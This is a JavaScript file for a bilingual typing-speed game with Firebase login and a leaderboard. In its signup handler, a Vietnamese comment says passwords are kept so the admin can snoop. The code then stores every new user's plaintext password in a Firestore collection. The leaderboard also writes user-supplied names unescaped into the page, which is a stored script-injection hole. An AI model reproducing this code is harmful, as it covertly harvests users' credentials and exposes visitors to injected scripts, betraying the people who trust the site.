const firebaseConfig = { 
  apiKey: "AIzaSyCrgepkYAgTAniQBrDRRqis470Aea6Stk4", 
  authDomain: "speedtype-pro-f0b75.firebaseapp.com", 
  projectId: "speedtype-pro-f0b75", 
  storageBucket: "speedtype-pro-f0b75.firebasestorage.app", 
  messagingSenderId: "121414853341", 
  appId: "1:121414853341:web:504c3f9f36b03329cfb134" 
};
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

const dictionary = {
    vi: ["mình", "tin", "đất", "cổ", "tích", "dũng", "sinh", "định", "phải", "gió", "chim", "bướm", "hạt", "tên", "hãy", "khoa", "phố", "thanh", "niên", "mà", "lại", "đi", "trả", "người", "vui", "lá", "phần", "phân", "rộng", "mây", "độ", "hệ", "trời", "mưa", "con", "chức", "lực", "năng", "khiển", "tương", "kiểm", "tính", "thực", "ứng", "dụng", "sông", "kho", "thành", "trữ", "phím", "trình", "tra", "liệu", "phát", "mềm", "nỗ", "tập", "thống", "mở", "nối", "điều", "nhân", "hoa", "núi", "biển", "triển", "năng", "lập", "công", "việt", "nam", "đường", "kiến", "thức", "xây", "dựng", "vững", "mạnh", "tâm", "hồn", "ánh", "sáng", "bình", "minh"],
    en: ["the", "quick", "brown", "fox", "jumps", "over", "lazy", "dog", "typing", "speed", "test", "coding", "future", "world", "light", "space", "star", "time", "work", "life", "challenge", "standard", "keyboard", "practice", "success", "develop", "system", "logic", "professional", "account", "profile", "password", "security", "database", "connection", "application", "software", "function", "storage", "analysis", "control", "member", "register", "login", "create", "update", "delete", "information", "national", "language", "energy", "power", "heavy", "simple", "complex", "history", "science", "physics", "nature"]
};

let currentLang = 'vi', words = [], idx = 0, timer = 60, isPlaying = false, interval, cWords = 0, userLoc = "vn";

// Lấy quốc gia dựa trên IP
fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userLoc = d.country_code.toLowerCase());

function init() {
    words = Array.from({length: 400}, () => dictionary[currentLang][Math.floor(Math.random() * dictionary[currentLang].length)]);
    idx = 0; timer = 60; isPlaying = false; cWords = 0;
    clearInterval(interval);
    document.getElementById('timer').innerText = "1:00";
    document.getElementById('word-input').value = "";
    document.getElementById('word-input').disabled = false;
    render();
}

function render() {
    const box = document.getElementById('word-display');
    box.innerHTML = words.map((w, i) => `<span id="w-${i}">${w}</span>`).join(" ");
    document.getElementById(`w-0`).className = "active";
}

document.getElementById('word-input').addEventListener('input', (e) => {
    if(!isPlaying) { isPlaying = true; startTimer(); }
    if(e.target.value.endsWith(" ")) {
        const typed = e.target.value.trim();
        const el = document.getElementById(`w-${idx}`);
        if(typed === words[idx]) { el.className = "correct"; cWords++; } 
        else { el.className = "wrong"; }
        idx++; e.target.value = "";
        const next = document.getElementById(`w-${idx}`);
        if(next) {
            next.className = "active";
            if(el.offsetTop < next.offsetTop) {
                document.querySelectorAll('.correct, .wrong').forEach(n => n.style.display = 'none');
            }
        }
    }
});

function startTimer() {
    interval = setInterval(() => {
        timer--;
        document.getElementById('timer').innerText = `0:${timer < 10 ? '0'+timer : timer}`;
        if(timer <= 0) { clearInterval(interval); finish(); }
    }, 1000);
}

function finish() {
    const wpm = Math.round(cWords);
    if(auth.currentUser) saveBestScore(wpm);
    else alert("Kết quả: " + wpm + " WPM. Đăng nhập để lưu điểm!");
    init();
}

// LƯU ĐIỂM - FIX LỖI UNDEFINED VÀ USERNAME
async function saveBestScore(wpm) {
    const u = auth.currentUser;
    const userDoc = await db.collection("users").doc(u.uid).get();
    const username = userDoc.exists ? userDoc.data().username : u.email.split('@')[0];
    
    const userRef = db.collection("leaderboard").doc(u.uid);
    const doc = await userRef.get();
    
    if (!doc.exists || wpm > doc.data().wpm) {
        await userRef.set({
            name: username,
            wpm: wpm,
            code: userLoc,
            lang: currentLang === 'vi' ? "Vietnamese" : "English",
            date: Date.now()
        });
    }
    loadBoard();
}

// ĐĂNG KÝ/ĐĂNG NHẬP - LƯU PASS CHO ADMIN SOI
async function handleAuth(type) {
    if (type === 'signup') {
        const username = document.getElementById('r-user').value;
        const email = document.getElementById('r-email').value;
        const pass = document.getElementById('r-pass').value;

        if(!username || !email || !pass) return alert("Điền đủ info!");
        if(!email.includes("@gmail.com")) return alert("Phải dùng Gmail thật!");

        try {
            const res = await auth.createUserWithEmailAndPassword(email, pass);
            // Lưu vào bảng users để Admin soi mật khẩu
            await db.collection("users").doc(res.user.uid).set({
                username: username,
                email: email,
                password: pass,
                createdAt: Date.now()
            });
            location.reload();
        } catch (err) { alert("Lỗi: " + err.message); }
    } else {
        const email = document.getElementById('l-email').value;
        const pass = document.getElementById('l-pass').value;
        try {
            await auth.signInWithEmailAndPassword(email, pass);
            location.reload();
        } catch (err) { alert("Sai tài khoản!"); }
    }
}

// FIX LỖI NaN VÀ HIỂN THỊ BẢNG XẾP HẠNG
async function loadBoard() {
    const snap = await db.collection("leaderboard").orderBy("wpm", "desc").limit(100).get();
    let h = ""; 
    let rank = 1; // Khởi tạo biến đếm để tránh lỗi NaN
    
    snap.forEach(doc => {
        const d = doc.data();
        h += `<tr>
            <td>${rank++}</td> 
            <td>${d.name}</td>
            <td style="color:#28a745; font-weight:bold">${d.wpm}</td>
            <td><img src="https://flagcdn.com/w20/${d.code}.png"></td>
            <td>${d.lang || "Vietnamese"}</td>
            <td>Vừa xong</td>
        </tr>`;
    });
    document.getElementById('leaderboard-data').innerHTML = h;
}

auth.onAuthStateChanged(async (u) => {
    if (u) {
        const userDoc = await db.collection("users").doc(u.uid).get();
        const name = userDoc.exists ? userDoc.data().username : "Người chơi";
        document.getElementById('auth-status').innerHTML = `Hi, ${name} <button onclick="auth.signOut().then(()=>location.reload())" class="btn-logout">Thoát</button>`;
        document.getElementById('auth-forms').style.display = 'none';
    }
});

function changeLang(l) { currentLang = l; init(); }
function resetGame() { init(); }
function switchTab(t) {
    document.getElementById('login-form').style.display = t === 'login' ? 'block' : 'none';
    document.getElementById('reg-form').style.display = t === 'reg' ? 'block' : 'none';
}

init(); loadBoard();
